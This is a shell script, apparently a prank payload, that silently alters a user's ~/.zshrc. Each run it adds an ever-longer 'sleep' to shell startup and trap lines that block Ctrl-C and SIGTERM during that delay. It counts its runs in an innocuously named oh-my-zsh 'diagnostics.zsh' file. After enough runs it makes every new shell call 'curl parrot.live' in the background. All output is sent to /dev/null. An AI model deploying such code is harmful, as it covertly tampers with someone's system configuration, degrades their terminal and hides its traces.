...
mkdir -p ~/.save > /dev/null 2>&1

if [ ! -f ~/.save/.zshrc ]; then
	cp -f ~/.zshrc .save/ > /dev/null 2>&1
fi

if [ -z "$(grep -E 'sleep [1-9]' ~/.zshrc)" ]; then
	sum_sleep=1
else
	old_sleep=$(grep -hE "sleep [1-9]" ~/.zshrc | sort -u | head -n 1 | cut -d ' ' -f2)
	sum_sleep=$(echo "$old_sleep + 0.5" | bc)
	sed -i "/sleep [0-9]/c\sleep $sum_sleep" ~/.zshrc > /dev/null 2>&1
fi

old_exec=$(grep -hE 'nb_exec [0-9]' ~/.oh-my-zsh/custom/diagnostics.zsh | cut -d " " -f3)

sed -i '/curl parrot.live &/d' ~/.zshrc > /dev/null 2>&1
sed -i '/sleep/d' ~/.zshrc > /dev/null 2>&1
sed -i '/trap/d' ~/.zshrc > /dev/null 2>&1
sed -i '/killall curl/d' ~/.zshrc > /dev/null 2>&1
echo "trap '' 2 > /dev/null 2>&1" >> ~/.zshrc
echo "trap '' 15 > /dev/null 2>&1" >> ~/.zshrc
if [[ $old_exec -gt 7  && $(echo "$sum_sleep >= 3" | bc -l) -eq 1 ]]; then
	echo 'curl parrot.live &' >> ~/.zshrc
else
	sum_exec=$(echo "$old_exec + 1" | bc)
	sed -i "/# nb_exec [0-9]/c\# nb_exec $sum_exec" ~/.oh-my-zsh/custom/diagnostics.zsh > /dev/null 2>&1
fi
echo "sleep $sum_sleep > /dev/null 2>&1" >> ~/.zshrc
echo "trap 15 > /dev/null 2>&1" >> ~/.zshrc
if [[ $old_exec -gt 7  && $(echo "$sum_sleep >= 3" | bc -l) -eq 1 ]]; then
	echo 'killall curl > /dev/null 2>&1' >> ~/.zshrc
fi
echo 'trap 2 > /dev/null 2>&1' >> ~/.zshrc
